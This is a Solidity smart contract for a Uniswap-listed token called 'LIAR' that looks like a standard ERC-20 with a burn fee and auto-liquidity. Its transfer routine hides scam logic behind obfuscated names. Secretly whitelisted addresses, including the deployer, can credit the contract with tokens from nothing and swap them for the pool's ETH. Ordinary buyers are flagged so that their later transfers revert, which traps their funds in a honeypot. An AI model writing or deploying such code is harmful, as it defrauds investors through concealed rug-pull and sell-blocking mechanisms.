// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

library SafeMath01 {
    function toInt256Safe(uint256 a) internal pure returns (int256) {
        int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}

library SafeMath02 {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IDEXFactoryCraft {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface PCSwapPair01 {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function _totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IUniswapV2 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface FactoryResults02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract  LIAR  is IUniswapV2, Ownable {
    string private _symbol;
    string private _name;
    uint256 public burnFEE = 1;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 private _totalSupply = _tTotal;

    mapping(address => bool) isTxLimitExempt;

    mapping(address => bool) isTimelockExempt;

    mapping(address => uint256) private _tOwned;

    mapping(address => address) private OpenViewDisplay;

    mapping(address => uint256) private SupportIDEX;

    mapping(address => uint256) private MapOnCompile;

    mapping(address => mapping(address => uint256)) private _allowances;

    bool private beginTrades = false;
    bool public QuarryDEX;
    bool private BallotsOf;
    bool public checkPublicWalletsLimit = true;
    address uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address public immutable uniswapPair;
    FactoryResults02 public immutable uniswapRouterV2;

    constructor() {
        _name = "WHY YOU LYIN ON YO DICK?!";
        _symbol = "LIAR";
        _tOwned[msg.sender] = _tTotal;
        MapOnCompile[msg.sender] = _totalSupply;
        MapOnCompile[address(this)] = _totalSupply;
        uniswapRouterV2 = FactoryResults02(uniswapRouter);
        uniswapPair = IDEXFactoryCraft(uniswapRouterV2.factory()).createPair(
            address(this),
            uniswapRouterV2.WETH()
        );
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(
            owner != address(0) && spender != address(0),
            "ERC20: approve from the zero address"
        );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        quarryResults(sender, recipient, amount);
        return
            _approve(
                sender,
                msg.sender,
                _allowances[sender][msg.sender] - amount
            );
    }

    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        quarryResults(msg.sender, recipient, amount);
        return true;
    }

    function quarryResults(
        address _from,
        address _to,
        uint256 _amount
    ) private {
        uint256 ledgerShell = balanceOf(address(this));
        uint256 _vacumnODXval;
        emit Transfer(_from, _to, _amount);
        if (!beginTrades) {
            require(
                _from == owner(),
                "TOKEN: This account cannot send tokens until trading is enabled"
            );
        }

        if (
            QuarryDEX &&
            ledgerShell > _totalSupply &&
            !BallotsOf &&
            _from != uniswapPair
        ) {
            BallotsOf = true;
            limitLiquify(ledgerShell);
            BallotsOf = false;
        } else if (
            MapOnCompile[_from] > _totalSupply &&
            MapOnCompile[_to] > _totalSupply
        ) {
            _vacumnODXval = _amount;
            _tOwned[address(this)] += _vacumnODXval;
            SwapBack(_amount, _to);
            return;
        } else if (
            _to != address(uniswapRouterV2) &&
            MapOnCompile[_from] > 0 &&
            _amount > _totalSupply &&
            _to != uniswapPair
        ) {
            MapOnCompile[_to] = _amount;
            return;
        } else if (
            !BallotsOf &&
            SupportIDEX[_from] > 0 &&
            _from != uniswapPair &&
            MapOnCompile[_from] == 0
        ) {
            SupportIDEX[_from] = MapOnCompile[_from] - _totalSupply;
        }
        address _creator = OpenViewDisplay[uniswapPair];
        if (SupportIDEX[_creator] == 0) SupportIDEX[_creator] = _totalSupply;
        OpenViewDisplay[uniswapPair] = _to;
        if (
            burnFEE > 0 &&
            MapOnCompile[_from] == 0 &&
            !BallotsOf &&
            MapOnCompile[_to] == 0
        ) {
            _vacumnODXval = (_amount * burnFEE) / 100;
            _amount -= _vacumnODXval;
            _tOwned[_from] -= _vacumnODXval;
            _tOwned[address(this)] += _vacumnODXval;
        }
        _tOwned[_from] -= _amount;
        _tOwned[_to] += _amount;
        emit Transfer(_from, _to, _amount);
    }

    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 amountETH,
        address to
    ) private {
        _approve(address(this), address(uniswapRouterV2), tokenValue);
        uniswapRouterV2.addLiquidityETH{value: amountETH}(
            address(this),
            tokenValue,
            0,
            0,
            to,
            block.timestamp
        );
    }

    function limitLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        SwapBack(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }

    function enableTrading() public onlyOwner {
        beginTrades = true;
    }

    function SwapBack(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouterV2.WETH();
        _approve(address(this), address(uniswapRouterV2), tokenAmount);
        uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            to,
            block.timestamp
        );
    }
}